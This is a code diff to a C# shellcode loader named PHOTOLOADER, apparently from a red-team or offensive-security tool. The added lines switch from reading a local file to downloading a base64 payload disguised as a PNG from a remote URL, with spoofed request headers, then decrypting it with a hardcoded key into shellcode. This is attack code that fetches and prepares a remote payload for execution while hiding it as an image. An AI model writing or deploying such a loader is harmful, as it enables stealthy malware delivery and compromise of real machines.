@@ -1,6 +1,7 @@
 using System;
 using System.Text;
 using System.Runtime.InteropServices;
+using System.Net;
 
 namespace PHOTOLOADER 
 {
@@ -100,9 +101,15 @@ namespace PHOTOLOADER
         }
         static void Main(string[] args) {
 
-            string file = $"[PNG PATH HERE]";
+            string file = $"{Environment.CurrentDirectory}/test.png";
 
-            byte[] encrypted = Convert.FromBase64String(System.IO.File.ReadAllText(file));
+            WebClient client = new WebClient();
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            client.Headers.Add(HttpRequestHeader.UserAgent, "Other");
+            client.Headers.Add(HttpRequestHeader.Accept, "application/pdf");
+
+            byte[] encrypted = Convert.FromBase64String(client.DownloadString("https://www.fortynorthsecurity.com/CompanyInfo/test.png"));
 
             byte[] shellcode = Apply(encrypted, Encoding.UTF8.GetBytes("thisisakey"));
 
